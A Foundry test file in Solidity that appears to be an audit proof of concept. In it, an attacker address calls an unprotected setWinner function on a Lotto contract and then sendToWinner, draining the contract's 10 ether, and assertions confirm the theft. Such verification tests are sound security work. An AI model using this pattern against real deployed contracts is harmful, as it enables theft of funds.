// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lotto.sol";

contract LottoExploitTest is Test {
    Lotto public lotto;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.prank(owner);
        lotto = new Lotto();
        // Directly fund contract with 10 ether
        deal(address(lotto), 10 ether);
    }

    function test_arbitrarySenderCanExtractEther() public {
        // Pre-attack check
        assertEq(address(lotto).balance, 10 ether, "Contract must be funded");

        console.log("--- BEFORE-Trigger Balances ---");
        uint256 contractBalanceBefore = address(lotto).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract balance: %d", contractBalanceBefore);
        console.log("Attacker balance: %d", attackerBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Attack: Attacker sets themselves as winner and takes funds
        vm.startPrank(attacker);
        lotto.setWinner(attacker, 10 ether);
        lotto.sendToWinner();
        vm.stopPrank();

        console.log("--- AFTER-Trigger Balances ---");
        uint256 contractBalanceAfter = address(lotto).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance: %d", contractBalanceAfter);
        console.log("Attacker balance: %d", attackerBalanceAfter);

        uint256 contractDiff = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerDiff = attackerBalanceAfter - attackerBalanceBefore;

        console.log("Contract balance change: %d", contractDiff);
        console.log("Attacker balance change: %d", attackerDiff);

        // Post-attack checks
        assertEq(contractBalanceAfter, 0, "Contract should be drained");
        assertEq(attackerBalanceAfter, 110 ether, "Attacker must receive stolen funds");

        // Differential verification
        if (contractBalanceAfter == 0 && attackerBalanceAfter == 110 ether) {
            console.log("Vulnerability Exists: Attacker successfully drained contract funds");
        } else {
            console.log("Vulnerability not Exist: Balances did not change as expected");
        }
    }
}